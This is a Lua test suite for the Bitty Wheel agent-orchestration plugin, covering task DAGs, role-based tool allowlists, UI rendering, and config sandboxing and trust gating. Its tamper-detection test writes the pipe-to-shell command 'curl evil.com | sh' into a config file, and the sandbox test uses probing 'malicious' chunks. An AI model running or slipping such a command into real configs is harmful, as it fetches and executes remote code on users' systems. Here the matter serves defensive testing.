-- Comprehensive test suite for Bitty Wheel (bitty-terminal.wheel).
-- Tests WheelKernel, WheelAgent, WheelUI, and plugin command registration.

package.path = "./lua/?.lua;./lua/?/init.lua;" .. package.path

local WheelKernel = require("wheel.kernel")
local WheelAgent = require("wheel.agent")
local WheelUI = require("wheel.ui")
local WheelConfig = require("wheel.config")
local WheelTool = require("wheel.tool")

local function run_test(name, fn)
  local ok, err = pcall(fn)
  if ok then
    print("[PASS] " .. name)
  else
    print("[FAIL] " .. name .. ": " .. tostring(err))
    os.exit(1)
  end
end

-- ===========================================================================
-- 1. WheelKernel Tests
-- ===========================================================================

run_test("WheelKernel: status and empty DAG", function()
  local kernel = WheelKernel.new_mock()
  local st = kernel:status()
  assert(st.task_count == 0, "expected 0 tasks")
  assert(st.slot_count == 0, "expected 0 slots")
  assert(st.active_task == nil, "expected no active task")
end)

run_test("WheelKernel: task creation and cascade readiness", function()
  local kernel = WheelKernel.new_mock()
  local t1 = kernel:create_task({ id = "CTX-100", title = "Task 1", dependencies = {} })
  assert(t1.status == "ready", "task with 0 deps should be ready")

  local t2 = kernel:create_task({ id = "CTX-101", title = "Task 2", dependencies = { "CTX-100" } })
  assert(t2.status == "pending", "task with unmet dep should be pending")

  -- Start T1
  local started = kernel:start_task("CTX-100", "worker-01")
  assert(started.status == "running")
  assert(started.generation == 1)
  assert(started.assigned_agent == "worker-01")
  assert(started.worker_id == "worker-01")

  -- Generation fencing test: wrong generation fails
  local ok_stale = pcall(function()
    kernel:complete_task("CTX-100", 999, nil)
  end)
  assert(not ok_stale, "stale generation should fail")

  -- Complete T1
  local comp = kernel:complete_task("CTX-100", 1, "hash123")
  assert(comp.status == "succeeded")

  -- T2 should automatically become Ready
  local t2_after = kernel:get_task("CTX-101")
  assert(t2_after.status == "ready", "T2 should be promoted to ready")
end)

run_test("WheelKernel: failure cascades Blocked", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "T-A", title = "A" })
  kernel:create_task({ id = "T-B", title = "B", dependencies = { "T-A" } })
  kernel:create_task({ id = "T-C", title = "C", dependencies = { "T-B" } })

  kernel:start_task("T-A", "worker")
  kernel:fail_task("T-A", 1, "build error")

  local ta = kernel:get_task("T-A")
  assert(ta.status == "failed")
  assert(ta.failure_reason == "build error")
  assert(ta.error == "build error")

  local tb = kernel:get_task("T-B")
  assert(tb.status == "blocked", "T-B should be Blocked")
  local tc = kernel:get_task("T-C")
  assert(tc.status == "blocked", "T-C should be Blocked transitively")
end)

run_test("WheelKernel: topological sort", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "C", title = "C", dependencies = { "B" } })
  kernel:create_task({ id = "A", title = "A", dependencies = {} })
  kernel:create_task({ id = "B", title = "B", dependencies = { "A" } })

  local order = kernel:topological_sort()
  assert(#order == 3)
  assert(order[1] == "A")
  assert(order[2] == "B")
  assert(order[3] == "C")
end)

run_test("WheelKernel: slots and Merkle hashing", function()
  local kernel = WheelKernel.new_mock()
  local s1 = kernel:put_slot("file1.lua", "print('hello')")
  assert(s1.size_bytes == 14)
  assert(s1.hash ~= nil)

  local fetched = kernel:get_slot("file1.lua")
  assert(fetched.found == true)
  assert(fetched.content == "print('hello')")

  local list = kernel:list_slots()
  assert(#list == 1)

  local rm = kernel:remove_slot("file1.lua")
  assert(rm.removed == true)
  local fetched2 = kernel:get_slot("file1.lua")
  assert(fetched2.found == false)
end)

run_test("WheelKernel: cognitive checkpoints and history log", function()
  local kernel = WheelKernel.new_mock()
  local cp1 = kernel:commit_checkpoint({
    why = "initial commit",
    what = "created scaffold",
    where_focus = "root",
  })
  assert(cp1.hash ~= nil)

  local cp2 = kernel:commit_checkpoint({
    why = "add feature",
    what = "implemented bridge",
    where_focus = "bridge",
  })
  assert(cp2.hash ~= nil)
  assert(cp2.parents[1] == cp1.hash)

  local log = kernel:log(10)
  assert(#log == 2)
  assert(log[1].hash == cp2.hash)
  assert(log[2].hash == cp1.hash)
end)

run_test("WheelKernel: action auto-spillover", function()
  local kernel = WheelKernel.new_mock()
  -- Small output
  local a1 = kernel:record_action({
    action_id = "act-1",
    raw_stdout = "small output",
  })
  assert(a1.spilled == false)

  -- Large output (> 4096 bytes)
  local big_str = string.rep("x", 5000)
  local a2 = kernel:record_action({
    action_id = "act-2",
    raw_stdout = big_str,
  })
  assert(a2.spilled == true)

  local recent = kernel:recent_actions()
  assert(#recent == 2)

  kernel:clear_recent_actions()
  assert(#kernel:recent_actions() == 0)
end)

run_test("WheelKernel: context compilation", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "T-CTX", title = "Active task" })
  kernel:set_active_task("T-CTX")

  local compiled = kernel:compile_context({
    system_instruction = "You are a coding assistant.",
    project_rules = { "Rule 1", "Rule 2" },
    tool_schemas = { "schema_read", "schema_write" },
    turn_prompt = "Perform step 1",
  })

  assert(compiled.prefix_hash ~= nil)
  assert(#compiled.zone1_prefix > 0)
  assert(compiled.zone2_state:find("T-CTX") ~= nil)
  assert(compiled.zone3_tail:find("Perform step 1") ~= nil)
  assert(compiled.total_bytes > 0)
end)

-- ===========================================================================
-- 2. WheelAgent Tests
-- ===========================================================================

run_test("WheelAgent: Commander plan decomposition", function()
  local kernel = WheelKernel.new_mock()
  local commander = WheelAgent.new({
    name = "commander-main",
    role = WheelAgent.Role.COMMANDER,
    kernel = kernel,
  })

  local plan = commander:decompose_plan({
    { id = "P-1", title = "Design", dependencies = {} },
    { id = "P-2", title = "Build", dependencies = { "P-1" } },
  })
  assert(#plan == 2)
  assert(kernel:get_task("P-1").status == "ready")
  assert(kernel:get_task("P-2").status == "pending")
end)

run_test("WheelAgent: Worker execution loop and checkpointing", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "W-1", title = "Coding Task", dependencies = {} })

  local worker = WheelAgent.new({
    name = "worker-code",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    tools = { "run_command" },
  })

  local outcome = worker:execute_task("W-1", function(agent, ctx, iter)
    return {
      action = { tool = "run_command", stdout = "test ok", exit_code = 0 },
      rationale = { why = "execute coding task", what = "ran test suite" },
      done = true,
    }
  end)

  assert(outcome.success == true)
  assert(outcome.task.status == "succeeded")
  assert(#outcome.checkpoints == 1)
  assert(kernel:status().active_task == nil, "active task should be cleared after execution")
end)

run_test("WheelAgent: Read-only authority enforcement", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "R-1", title = "Research Task", dependencies = {} })

  local researcher = WheelAgent.new({
    name = "researcher-01",
    role = WheelAgent.Role.RESEARCH,
    kernel = kernel,
    tools = { "read_file", "write_file" }, -- write_file declared but disallowed by role
  })

  -- Read file is allowed
  local allowed, _ = researcher:is_tool_allowed("read_file")
  assert(allowed == true)

  -- Write file is denied due to role
  local denied, err = researcher:is_tool_allowed("write_file")
  assert(denied == false)
  assert(err:find("read-only authority", 1, true) ~= nil)

  -- Attempting mutating action during task execution fails task
  local outcome = researcher:execute_task("R-1", function(agent, ctx, iter)
    return {
      action = { tool = "write_file", stdout = "wrote something" },
    }
  end)
  assert(outcome.success == false)
  assert(outcome.task.status == "failed")
  assert(outcome.error:find("read-only authority", 1, true) ~= nil)
end)

run_test("WheelAgent: Reviewer verification and approval", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "REV-1", title = "Feature Task", dependencies = {} })
  kernel:start_task("REV-1", "worker")
  kernel:complete_task("REV-1", 1, "cp_hash_123")

  local reviewer = WheelAgent.new({
    name = "reviewer-01",
    role = WheelAgent.Role.REVIEWER,
    kernel = kernel,
    tools = { "read_file" },
  })

  local rev = reviewer:review_task("REV-1", function(agent, task, history)
    assert(task.id == "REV-1")
    return true, "all acceptance criteria verified"
  end)

  assert(rev.approved == true)
  assert(rev.checkpoint ~= nil)
end)

-- ===========================================================================
-- 3. WheelUI Tests
-- ===========================================================================

run_test("WheelUI: status, graph waves, and telemetry", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "T-1", title = "Task 1", priority = 0 })
  kernel:create_task({ id = "T-2", title = "Task 2", priority = 1, dependencies = { "T-1" } })
  kernel:create_task({ id = "T-3", title = "Task 3", priority = 2, dependencies = { "T-1" } })
  kernel:create_task({ id = "T-4", title = "Task 4", priority = 0, dependencies = { "T-2", "T-3" } })

  kernel:start_task("T-1", "w1")
  kernel:complete_task("T-1", 1, "cp1")
  kernel:start_task("T-2", "w2")
  kernel:set_active_task("T-2")

  local status_str = WheelUI.format_status(kernel)
  assert(status_str:find("Active Task:%s+T%-2") ~= nil)
  assert(status_str:find("Tasks: 4 total") ~= nil)

  local graph_str = WheelUI.format_graph(kernel)
  assert(graph_str:find("%-%- Wave 1") ~= nil)
  assert(graph_str:find("%-%- Wave 2") ~= nil)
  assert(graph_str:find("%-%- Wave 3") ~= nil)
  assert(graph_str:find("%[▶%] T%-2 %(P1%): Task 2 <%-%- ACTIVE") ~= nil)
  assert(graph_str:find("%[•%] T%-3 %(P2%): Task 3") ~= nil)

  local ctx = kernel:compile_context({ turn_prompt = "hello" })
  local telem_str = WheelUI.format_telemetry(ctx)
  assert(telem_str:find("Prefix Hash:") ~= nil)
  assert(telem_str:find("Total Bytes:") ~= nil)

  local scene = WheelUI.render_scene_node(kernel)
  assert(scene.type == "Text")
  assert(type(scene.content) == "string")
end)

run_test("WheelUI: diamond and multi-path DAG topological wave calculation", function()
  -- 1. Symmetric Diamond DAG: A -> B -> D, A -> C -> D
  local diamond_tasks = {
    { id = "D", dependencies = { "B", "C" } },
    { id = "C", dependencies = { "A" } },
    { id = "B", dependencies = { "A" } },
    { id = "A", dependencies = {} },
  }
  local depths, max_wave = WheelUI.calculate_waves(diamond_tasks)
  assert(depths["A"] == 1, "A should be Wave 1")
  assert(depths["B"] == 2, "B should be Wave 2")
  assert(depths["C"] == 2, "C should be Wave 2")
  assert(depths["D"] == 3, "D should be Wave 3")
  assert(max_wave == 3, "max_wave should be 3")

  -- 2. Asymmetric Diamond / Multi-path DAG: A -> B -> C -> D, and A -> D
  local asymmetric_tasks = {
    { id = "D", dependencies = { "A", "C" } },
    { id = "A", dependencies = {} },
    { id = "B", dependencies = { "A" } },
    { id = "C", dependencies = { "B" } },
  }
  local asym_depths, asym_max = WheelUI.calculate_waves(asymmetric_tasks)
  assert(asym_depths["A"] == 1, "A should be Wave 1")
  assert(asym_depths["B"] == 2, "B should be Wave 2")
  assert(asym_depths["C"] == 3, "C should be Wave 3")
  assert(asym_depths["D"] == 4, "D should be Wave 4 via longest path A->B->C->D")
  assert(asym_max == 4, "max_wave should be 4")

  -- 3. Missing dependencies field resilience
  local raw_tasks = {
    { id = "RAW-1", title = "Task without dependencies field" },
    { id = "RAW-2", title = "Second task without field" },
    { id = "RAW-3", dependencies = { "RAW-1" } },
  }
  local raw_depths, raw_max = WheelUI.calculate_waves(raw_tasks)
  assert(raw_depths["RAW-1"] == 1, "RAW-1 should be Wave 1")
  assert(raw_depths["RAW-2"] == 1, "RAW-2 should be Wave 1")
  assert(raw_depths["RAW-3"] == 2, "RAW-3 should be Wave 2")
  assert(raw_max == 2, "raw_max should be 2")

  -- 4. External missing prerequisite resilience
  local ext_tasks = {
    { id = "EXT-DEP", dependencies = { "NON_EXISTENT_UPSTREAM" } },
  }
  local ext_depths, ext_max = WheelUI.calculate_waves(ext_tasks)
  assert(ext_depths["EXT-DEP"] == 2, "task with missing external dependency resolves to depth 2")
  assert(ext_max == 2)

  -- 5. Cycle guard: cycle does not crash or loop infinitely
  local cycle_tasks = {
    { id = "CYC-1", dependencies = { "CYC-2" } },
    { id = "CYC-2", dependencies = { "CYC-1" } },
  }
  local cyc_depths, cyc_max = WheelUI.calculate_waves(cycle_tasks)
  assert(type(cyc_depths["CYC-1"]) == "number")
  assert(type(cyc_depths["CYC-2"]) == "number")
  assert(cyc_max >= 1)
end)

-- ===========================================================================
-- 4. Plugin Init and Command Registration Tests
-- ===========================================================================

run_test("Wheel Init: command registration and dispatch", function()
  -- Mock bitty host API
  local registered_commands = {}
  local notifications = {}

  bitty = {
    commands = {
      register = function(def)
        registered_commands[def.id] = def
        return 1
      end,
    },
    notify = {
      show = function(payload)
        table.insert(notifications, payload)
        return true
      end,
    },
  }

  -- Load init.lua
  local wheel = require("wheel.init")
  assert(wheel.kernel ~= nil)
  assert(wheel.agent ~= nil)
  assert(wheel.ui ~= nil)

  -- Verify all 5 commands were registered
  assert(registered_commands["hello"] ~= nil, "hello command registered")
  assert(registered_commands["status"] ~= nil, "status command registered")
  assert(registered_commands["graph"] ~= nil, "graph command registered")
  assert(registered_commands["plan"] ~= nil, "plan command registered")
  assert(registered_commands["run"] ~= nil, "run command registered")

  -- Test running hello
  registered_commands["hello"].run()
  assert(#notifications == 1)
  assert(notifications[1].title == "Wheel")

  -- Test running plan
  registered_commands["plan"].run()
  assert(#notifications == 2)
  assert(notifications[2].title == "Wheel Plan")
  assert(#wheel.kernel:list_tasks() == 3)

  -- Test running status
  registered_commands["status"].run()
  assert(#notifications == 3)
  assert(notifications[3].title == "Wheel Status")

  -- Test running graph
  registered_commands["graph"].run()
  assert(#notifications == 4)
  assert(notifications[4].title == "Wheel Task DAG")

  -- Test running run (executes CTX-0001)
  registered_commands["run"].run()
  assert(#notifications == 5)
  assert(notifications[5].title == "Wheel Run")
  assert((wheel.kernel:get_task("CTX-0001").status or ""):lower() == "succeeded")
  -- CTX-0002 should now be Ready
  assert((wheel.kernel:get_task("CTX-0002").status or ""):lower() == "ready")
end)

-- ===========================================================================
-- 5. Wire Normalization and Null Semantics Tests
-- ===========================================================================

run_test("Wheel: Wire format normalization and null task semantics", function()
  local kernel = WheelKernel.new_mock()

  -- 1. Missing task returns nil (matching Rust null data payload)
  local missing = kernel:get_task("nonexistent-999")
  assert(missing == nil, "missing task should return nil")

  -- 2. Mock task.create sets snake_case status, assigned_agent, failure_reason
  local t = kernel:create_task({ id = "NORM-1", title = "Normalize Test" })
  assert(t.status == "ready", "status should be snake_case ready")
  assert(t.assigned_agent == nil)

  local started = kernel:start_task("NORM-1", "worker-wire-01")
  assert(started.status == "running", "status should be snake_case running")
  assert(started.assigned_agent == "worker-wire-01")
  assert(started.worker_id == "worker-wire-01")

  local failed = kernel:fail_task("NORM-1", 1, "test failure reason")
  assert(failed.status == "failed", "status should be snake_case failed")
  assert(failed.failure_reason == "test failure reason")
  assert(failed.error == "test failure reason")

  -- 3. UI format_graph renders snake_case status badges and failure_reason
  local graph_str = WheelUI.format_graph(kernel)
  assert(graph_str:find("%[✗%] NORM%-1") ~= nil, "should render failed badge for snake_case status")
  assert(graph_str:find("err:%s+test failure reason") ~= nil, "should render failure_reason")

  -- 4. UI format_graph also correctly renders legacy PascalCase tasks
  local custom_kernel = WheelKernel.new(function(cmd, payload)
    if cmd == "kernel.status" then
      return '{"success":true,"data":{"active_task":null,"task_count":1,"slot_count":0}}'
    elseif cmd == "task.list" then
      return '{"success":true,"data":[{"id":"PASCAL-1","title":"Legacy","status":"Ready","dependencies":[]}]}'
    end
    return '{"success":false,"error":"unsupported"}'
  end)
  local pascal_graph = WheelUI.format_graph(custom_kernel)
  assert(pascal_graph:find("%[•%] PASCAL%-1") ~= nil, "should render ready badge for PascalCase status")

  -- 5. Agent execute_task accepts lowercase ready
  local exec_kernel = WheelKernel.new_mock()
  exec_kernel:create_task({ id = "EXEC-1", title = "Exec Test" })
  local worker = WheelAgent.new({
    name = "worker-norm",
    role = WheelAgent.Role.CODING,
    kernel = exec_kernel,
  })
  local outcome = worker:execute_task("EXEC-1", function(agent, ctx, iter)
    return { done = true }
  end)
  assert(outcome.success == true)
  assert(outcome.task.status == "succeeded")

  -- 6. Agent review_task accepts lowercase succeeded
  local reviewer = WheelAgent.new({
    name = "reviewer-norm",
    role = WheelAgent.Role.REVIEWER,
    kernel = exec_kernel,
  })
  local rev = reviewer:review_task("EXEC-1", function(agent, task, history)
    assert(task.status == "succeeded")
    return true, "approved"
  end)
  assert(rev.approved == true)

  -- 7. UI format_graph renders assigned worker
  assert(graph_str:find("worker:%s+worker%-wire%-01") ~= nil, "should render assigned worker")

  -- 8. UI format_graph falls back to error when failure_reason is empty string
  local fallback_kernel = WheelKernel.new(function(cmd, payload)
    if cmd == "kernel.status" then
      return '{"success":true,"data":{"active_task":null,"task_count":1,"slot_count":0}}'
    elseif cmd == "task.list" then
      return '{"success":true,"data":[{"id":"ERR-1","title":"Fallback","status":"failed","failure_reason":"","error":"fallback error message"}]}'
    end
    return '{"success":false,"error":"unsupported"}'
  end)
  local fallback_graph = WheelUI.format_graph(fallback_kernel)
  assert(fallback_graph:find("err:%s+fallback error message") ~= nil, "empty failure_reason should fall back to error")

  -- 9. Agent execute_task rejects task already assigned to a different worker
  exec_kernel:create_task({ id = "ASSIGN-1", title = "Assigned task", assigned_agent = "other-worker" })
  local conflict_worker = WheelAgent.new({
    name = "my-worker",
    role = WheelAgent.Role.CODING,
    kernel = exec_kernel,
  })
  local ok_conflict, conflict_err = pcall(function()
    conflict_worker:execute_task("ASSIGN-1", function() return { done = true } end)
  end)
  assert(conflict_err:find("already assigned to other%-worker") ~= nil)

  -- 10. UI format_graph falls back to worker_id when assigned_agent is empty string
  local worker_fallback_kernel = WheelKernel.new(function(cmd, payload)
    if cmd == "kernel.status" then
      return '{"success":true,"data":{"active_task":null,"task_count":1,"slot_count":0}}'
    elseif cmd == "task.list" then
      return '{"success":true,"data":[{"id":"WORK-1","title":"Fallback Worker","status":"running","assigned_agent":"","worker_id":"legacy-worker"}]}'
    end
    return '{"success":false,"error":"unsupported"}'
  end)
  local worker_fallback_graph = WheelUI.format_graph(worker_fallback_kernel)
  assert(worker_fallback_graph:find("worker:%s+legacy%-worker") ~= nil, "empty assigned_agent should fall back to worker_id")

  -- 11. Agent execute_task rejects task when assigned_agent is empty string but worker_id is other worker
  local empty_agent_kernel = WheelKernel.new(function(cmd, payload)
    if cmd == "kernel.status" then
      return '{"success":true,"data":{"active_task":null,"task_count":1,"slot_count":0}}'
    elseif cmd == "task.get" then
      return '{"success":true,"data":{"id":"WORK-2","title":"Worker Task","status":"ready","assigned_agent":"","worker_id":"other-worker","dependencies":[]}}'
    end
    return '{"success":false,"error":"unsupported"}'
  end)
  local conflict_worker2 = WheelAgent.new({
    name = "my-worker",
    role = WheelAgent.Role.CODING,
    kernel = empty_agent_kernel,
  })
  local ok_conflict2, conflict_err2 = pcall(function()
    conflict_worker2:execute_task("WORK-2", function() return { done = true } end)
  end)
  assert(not ok_conflict2, "should reject task when worker_id is set to another worker")
  assert(conflict_err2:find("already assigned to other%-worker") ~= nil)
end)

-- ===========================================================================
-- 6. Pure-Lua JSON Codec Control Character Escaping Tests
-- ===========================================================================

run_test("WheelKernel.JSON: control character escaping and roundtrip", function()
  local codec = WheelKernel.JSON
  assert(codec ~= nil, "WheelKernel.JSON fallback codec must be exported")

  -- 1. NUL (0x00)
  local nul_str = "hello\0world"
  local enc_nul = codec.encode(nul_str)
  assert(enc_nul:find("\\u0000") ~= nil, "should escape NUL byte as \\u0000")
  local dec_nul = codec.decode(enc_nul)
  assert(dec_nul == nul_str, "decoded NUL string must match original")

  -- 2. ANSI Escape sequence (0x1B = ESC)
  local ansi_str = "\27[32mSUCCESS\27[0m"
  local enc_ansi = codec.encode(ansi_str)
  assert(enc_ansi:find("\\u001b") ~= nil, "should escape ESC byte as \\u001b")
  local dec_ansi = codec.decode(enc_ansi)
  assert(dec_ansi == ansi_str, "decoded ANSI string must match original")

  -- 3. BEL (0x07) and other C0 control chars
  local c0_str = "bell:\7,soh:\1,etx:\3,syn:\22"
  local enc_c0 = codec.encode(c0_str)
  assert(enc_c0:find("\\u0007") ~= nil, "should escape BEL as \\u0007")
  assert(enc_c0:find("\\u0001") ~= nil, "should escape SOH as \\u0001")
  assert(enc_c0:find("\\u0003") ~= nil, "should escape ETX as \\u0003")
  assert(enc_c0:find("\\u0016") ~= nil, "should escape SYN as \\u0016")
  local dec_c0 = codec.decode(enc_c0)
  assert(dec_c0 == c0_str, "decoded C0 control string must match original")

  -- 4. Standard whitespace escapes preserved
  local ws_str = "tab:\t,nl:\n,cr:\r"
  local enc_ws = codec.encode(ws_str)
  assert(enc_ws:find("\\t") ~= nil, "should escape tab as \\t")
  assert(enc_ws:find("\\n") ~= nil, "should escape newline as \\n")
  assert(enc_ws:find("\\r") ~= nil, "should escape cr as \\r")
  local dec_ws = codec.decode(enc_ws)
  assert(dec_ws == ws_str, "decoded whitespace string must match original")

  -- 5. Complex nested table with mixed control characters
  local complex_tbl = {
    ansi = ansi_str,
    nul = nul_str,
    nested = { count = 42, note = "test\0001" },
  }
  local enc_tbl = codec.encode(complex_tbl)
  local dec_tbl = codec.decode(enc_tbl)
  assert(dec_tbl.ansi == ansi_str)
  assert(dec_tbl.nul == nul_str)
  assert(dec_tbl.nested.count == 42)
  assert(dec_tbl.nested.note == "test\0001")
end)

-- ===========================================================================
-- 7. Expanded Read-Only Tool Allowlist Tests
-- ===========================================================================

run_test("WheelAgent: expanded read-only tool allowlist", function()
  assert(type(WheelAgent.READ_ONLY_TOOLS) == "table", "WheelAgent.READ_ONLY_TOOLS must be exported")

  local expected_tools = {
    "read_file",
    "view_file",
    "search_code",
    "find_files",
    "list_directory",
    "inspect",
    "git_diff",
    "git_log",
    "git_status",
    "read_resource",
    "list_resources",
    "read_url_content",
    "search_web",
    "ask_question",
    "get_outline",
  }

  for _, tool in ipairs(expected_tools) do
    assert(WheelAgent.READ_ONLY_TOOLS[tool] == true, "tool " .. tool .. " must be in READ_ONLY_TOOLS")
  end

  local researcher = WheelAgent.new({
    name = "research-tester",
    role = WheelAgent.Role.RESEARCH,
    kernel = WheelKernel.new_mock(),
    tools = expected_tools,
  })

  -- All 15 tools must be allowed for Research role
  for _, tool in ipairs(expected_tools) do
    local allowed, err = researcher:is_tool_allowed(tool)
    assert(allowed == true, "researcher should be allowed " .. tool .. ": " .. tostring(err))
  end

  -- Mutating tools must be denied
  local mutating_tools = { "write_file", "apply_diff", "run_command", "replace_file_content" }
  for _, tool in ipairs(mutating_tools) do
    local allowed, err = researcher:is_tool_allowed(tool)
    assert(allowed == false, "researcher must be denied mutating tool " .. tool)
  end
end)

-- ===========================================================================
-- 8. Wheel Configuration System and Security Gates (CTX-0011)
-- ===========================================================================

run_test("WheelConfig: 8 function classes schema and default values", function()
  assert(type(WheelConfig.DEFAULTS) == "table", "DEFAULTS must be a table")
  local d = WheelConfig.DEFAULTS

  -- 1. Roles
  assert(type(d.roles) == "table", "roles must be defined")
  assert(d.roles.commander and d.roles.commander.name == "commander")
  assert(d.roles.coding and d.roles.coding.name == "worker-coding")
  assert(d.roles.debug and d.roles.debug.name == "worker-debug")
  assert(d.roles.research and d.roles.research.name == "worker-research")
  assert(d.roles.reviewer and d.roles.reviewer.name == "reviewer")

  -- 2. Directives
  assert(type(d.directives) == "table" and #d.directives >= 2)

  -- 3. Tools
  assert(type(d.tools) == "table" and type(d.tools.allow) == "table")

  -- 4. Skills
  assert(type(d.skills) == "table" and type(d.skills.disabled) == "table")

  -- 5. Verification
  assert(type(d.verification) == "table" and d.verification.change_gated == true)
  assert(d.verification.test_command == "just check")

  -- 6. Context
  assert(type(d.context) == "table" and d.context.max_budget_bytes == 65536)
  assert(d.context.zone1_max_bytes == 16384)
  assert(d.context.zone2_max_bytes == 32768)
  assert(d.context.zone3_max_bytes == 16384)

  -- 7. Headless Panel container policy
  assert(type(d.panel) == "table", "panel policy must be defined")
  assert(d.panel.headless == true, "agent must default to headless = true")

  -- 8. Lifecycle hooks
  assert(type(d.hooks) == "table")
end)

run_test("WheelConfig: compute_hash deterministic 64-hex string", function()
  local str1 = "return { verification = { change_gated = true } }"
  local str2 = "return { verification = { change_gated = false } }"

  local h1_a = WheelConfig.compute_hash(str1)
  local h1_b = WheelConfig.compute_hash(str1)
  local h2 = WheelConfig.compute_hash(str2)

  assert(#h1_a == 64, "hash must be 64 characters hex")
  assert(h1_a:match("^%x+$") ~= nil, "hash must be valid hex")
  assert(h1_a == h1_b, "identical content must produce identical hash")
  assert(h1_a ~= h2, "different content must produce different hash")

  -- NIST SHA-256 test vectors
  assert(
    WheelConfig.compute_hash("abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
    "NIST SHA-256 vector for 'abc'"
  )
  assert(
    WheelConfig.compute_hash("") == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "NIST SHA-256 vector for empty string"
  )
end)

run_test("WheelConfig: sandboxed evaluation restricts ambient authority", function()
  local malicious = [[
    local has_io = (io ~= nil)
    local has_os = (os ~= nil)
    local has_loadfile = (loadfile ~= nil)
    -- Attempt to mutate standard library in sandbox
    string.polluted = true
    return {
      has_io = has_io,
      has_os = has_os,
      has_loadfile = has_loadfile,
      safe_val = 12345,
    }
  ]]
  local ok_eval, tbl = WheelConfig.eval_chunk(malicious, "malicious_test")
  assert(ok_eval == true, "chunk should eval without crashing host")
  assert(tbl.has_io == false, "ambient io must not be accessible in sandbox")
  assert(tbl.has_os == false, "ambient os must not be accessible in sandbox")
  assert(tbl.has_loadfile == false, "loadfile must not be accessible in sandbox")
  assert(tbl.safe_val == 12345, "safe variables should evaluate properly")
  assert(string.polluted == nil, "standard library tables must be isolated from sandbox mutation")

  -- Expensive string.rep bounds check
  local big_rep = "return { big = string.rep('A', 100000) }"
  local ok_rep, err_rep = WheelConfig.eval_chunk(big_rep, "big_rep_test")
  assert(ok_rep == false, "string.rep > 65536 must fail closed")
  assert(string.find(tostring(err_rep), "safety bound") ~= nil, "error message specifies safety bound")

  -- Infinite loop instruction count limit
  local infinite_loop = "while true do end return {}"
  local ok_loop, err_loop = WheelConfig.eval_chunk(infinite_loop, "loop_test")
  assert(ok_loop == false, "infinite loop must fail closed under instruction limit")
  assert(string.find(tostring(err_loop), "instruction limit") ~= nil, "error message specifies instruction limit")
end)

run_test("WheelConfig: hierarchical layering (Defaults < Global < Project)", function()
  local tmp_dir = "/tmp/bitty/test_wheel_config_layering"
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. tmp_dir .. "/global " .. tmp_dir .. "/proj/.wheel")

  local global_file = tmp_dir .. "/global/init.lua"
  local gf = io.open(global_file, "w")
  gf:write([[
    return {
      verification = {
        test_command = "cargo test",
      },
      roles = {
        coding = {
          model = { name = "gpt-4o", temperature = 0.5 },
        },
      },
    }
  ]])
  gf:close()

  local proj_file = tmp_dir .. "/proj/.wheel/init.lua"
  local pf = io.open(proj_file, "w")
  pf:write([[
    return {
      verification = {
        test_command = "just ci-local",
      },
      panel = {
        name = "project-custom-panel",
        headless = true,
      },
    }
  ]])
  pf:close()

  -- Load with trust bypass (opts.trusted = true) to verify pure merge precedence
  local res = WheelConfig.load({
    project_root = tmp_dir .. "/proj",
    global_path = global_file,
    trusted = true,
  })

  assert(res.ok == true, "load should succeed")
  assert(res.layers.defaults == true, "defaults layer loaded")
  assert(res.layers.global == true, "global layer loaded")
  assert(res.layers.project == true, "project layer loaded")

  -- Precedence: Project overrides Global and Defaults
  -- Project test_command is "just ci-local", overriding Global's "cargo test" and Defaults' "just check"
  assert(res.config.verification.test_command == "just ci-local", "project should override global test_command")
  -- Global model is "gpt-4o", overriding Defaults' "claude-3-5-sonnet"
  assert(res.config.roles.coding.model.name == "gpt-4o", "global should override defaults model")
  -- Defaults directives still retained
  assert(#res.config.directives >= 2, "defaults directives should be retained")
  -- Project panel name
  assert(res.config.panel.name == "project-custom-panel")

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelConfig: direnv-style security trust gate, tamper detection, and untrust", function()
  local tmp_dir = "/tmp/bitty/test_wheel_trust_gate"
  local proj_dir = tmp_dir .. "/my_repo"
  local trust_file = tmp_dir .. "/trusted_projects.json"
  os.execute("rm -rf " .. tmp_dir .. " && mkdir -p " .. proj_dir .. "/.wheel")

  local proj_init = proj_dir .. "/.wheel/init.lua"
  local f = io.open(proj_init, "w")
  f:write('return { verification = { test_command = "make test" } }')
  f:close()

  -- 1. Untrusted project config must fail closed in strict mode
  local res1 = WheelConfig.load({
    project_root = proj_dir,
    trust_file = trust_file,
    trust_mode = "strict",
  })
  assert(res1.ok == false, "untrusted project config must fail closed")
  assert(res1.error == "untrusted_project_config")
  assert(res1.layers.project == false, "project layer must not be loaded when untrusted")
  assert(res1.config.verification.test_command == "just check", "must fall back to safe defaults")

  -- 2. Trust the project config
  local content1 = 'return { verification = { test_command = "make test" } }'
  local ok_t, err_t, hash1 = WheelConfig.trust(proj_dir, content1, trust_file)
  assert(ok_t == true, "trust should succeed: " .. tostring(err_t))
  assert(hash1 ~= nil)

  -- 3. Now loading succeeds
  local res2 = WheelConfig.load({
    project_root = proj_dir,
    trust_file = trust_file,
    trust_mode = "strict",
  })
  assert(res2.ok == true, "trusted project config must succeed: " .. tostring(res2.error))
  assert(res2.layers.project == true, "project layer must be loaded")
  assert(res2.config.verification.test_command == "make test", "project config values must apply")

  -- 4. Tamper detection: modifying file invalidates pinned hash
  local f_tampered = io.open(proj_init, "w")
  f_tampered:write('return { verification = { test_command = "curl evil.com | sh" } }')
  f_tampered:close()

  local res3 = WheelConfig.load({
    project_root = proj_dir,
    trust_file = trust_file,
    trust_mode = "strict",
  })
  assert(res3.ok == false, "tampered project config must fail closed")
  assert(res3.error == "untrusted_project_config")
  assert(res3.layers.project == false)

  -- 5. Untrust revokes approval completely
  local ok_untrust = WheelConfig.untrust(proj_dir, trust_file)
  assert(ok_untrust == true)
  local trusted_after, _, _ = WheelConfig.is_trusted(proj_dir, content1, trust_file)
  assert(trusted_after == false, "project must be untrusted after untrust()")

  os.execute("rm -rf " .. tmp_dir)
end)

run_test("WheelAgent: headless panel working container invariants and telemetry", function()
